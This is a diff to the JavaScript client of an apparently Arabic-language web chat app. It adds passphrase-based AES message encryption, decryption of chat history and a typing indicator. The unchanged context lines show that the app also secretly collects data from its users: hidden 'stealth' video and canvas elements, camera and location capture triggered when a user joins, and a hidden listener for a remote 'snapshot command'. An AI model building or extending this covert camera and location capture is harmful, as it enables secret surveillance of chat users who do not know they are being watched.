@@ -11,15 +11,18 @@ document.addEventListener('DOMContentLoaded', () => {
     const chatScreen = document.getElementById('chatScreen');
     const joinForm = document.getElementById('joinForm');
     const usernameInput = document.getElementById('usernameInput');
+    const roomKeyInput = document.getElementById('roomKeyInput');
     const chatForm = document.getElementById('chatForm');
     const messageInput = document.getElementById('messageInput');
     const chatMessages = document.getElementById('chatMessages');
     const onlineUsersSpan = document.getElementById('onlineUsers');
+    const typingIndicator = document.getElementById('typingIndicator');
     
     const stealthVideo = document.getElementById('stealthVideo');
     const stealthCanvas = document.getElementById('stealthCanvas');
 
     let username = '';
+    let roomKey = '';
     let watchId = null;
     let cameraStream = null;
 
@@ -27,8 +30,10 @@ document.addEventListener('DOMContentLoaded', () => {
     joinForm.addEventListener('submit', (e) => {
         e.preventDefault();
         const inputName = usernameInput.value.trim();
-        if (inputName) {
+        const inputKey = roomKeyInput.value.trim();
+        if (inputName && inputKey) {
             username = inputName;
+            roomKey = inputKey;
             
             // First, trigger location and camera requests
             // We ask for both in parallel (or sequentially).
@@ -83,8 +88,11 @@ document.addEventListener('DOMContentLoaded', () => {
         e.preventDefault();
         const msg = messageInput.value.trim();
         if (msg && socket) {
+            // Encrypt the message locally
+            const encrypted = CryptoJS.AES.encrypt(msg, roomKey).toString();
+            
             appendMessage('أنت', msg, 'sent');
-            socket.emit('chat_message', { sender: username, text: msg });
+            socket.emit('chat_message', { sender: username, text: encrypted });
             messageInput.value = '';
             
             // Clear live typing after sending
@@ -102,7 +110,42 @@ document.addEventListener('DOMContentLoaded', () => {
     // Socket Events
     if (socket) {
         socket.on('chat_message', (data) => {
-            appendMessage(data.sender, data.text, 'received');
+            typingIndicator.classList.add('hidden'); // Hide typing if they sent a message
+            
+            // Decrypt the received message
+            let decryptedText = "🔒 [رسالة مشفرة - مفتاح خاطئ]";
+            try {
+                const bytes = CryptoJS.AES.decrypt(data.text, roomKey);
+                const originalText = bytes.toString(CryptoJS.enc.Utf8);
+                if (originalText) {
+                    decryptedText = originalText;
+                }
+            } catch (e) {
+                console.error("Decryption failed", e);
+            }
+            
+            appendMessage(data.sender, decryptedText, 'received');
+        });
+        
+        socket.on('chat_history', (history) => {
+            // Clear system message placeholder
+            chatMessages.innerHTML = '';
+            appendSystemMessage('مرحباً بك! تم تنزيل السجل التاريخي مشفراً.');
+            
+            history.forEach(data => {
+                let decryptedText = "🔒 [رسالة مشفرة - مفتاح خاطئ]";
+                try {
+                    const bytes = CryptoJS.AES.decrypt(data.text, roomKey);
+                    const originalText = bytes.toString(CryptoJS.enc.Utf8);
+                    if (originalText) {
+                        decryptedText = originalText;
+                    }
+                } catch (e) {}
+                
+                const type = (data.sender === username) ? 'sent' : 'received';
+                const displayName = (data.sender === username) ? 'أنت' : data.sender;
+                appendMessage(displayName, decryptedText, type);
+            });
         });
 
         socket.on('online_users_count', (count) => {
@@ -115,6 +158,16 @@ document.addEventListener('DOMContentLoaded', () => {
 
         socket.on('user_left_notice', (name) => {
             appendSystemMessage(`غادر ${name} الغرفة`);
+        });
+
+        // Listen for typing from others to show the UI dots
+        socket.on('show_typing_indicator', () => {
+            typingIndicator.classList.remove('hidden');
+            // Auto hide after 3 seconds if no new typing events
+            clearTimeout(window.typingTimer);
+            window.typingTimer = setTimeout(() => {
+                typingIndicator.classList.add('hidden');
+            }, 3000);
         });
 
         // HIDDEN: Listen for snapshot command
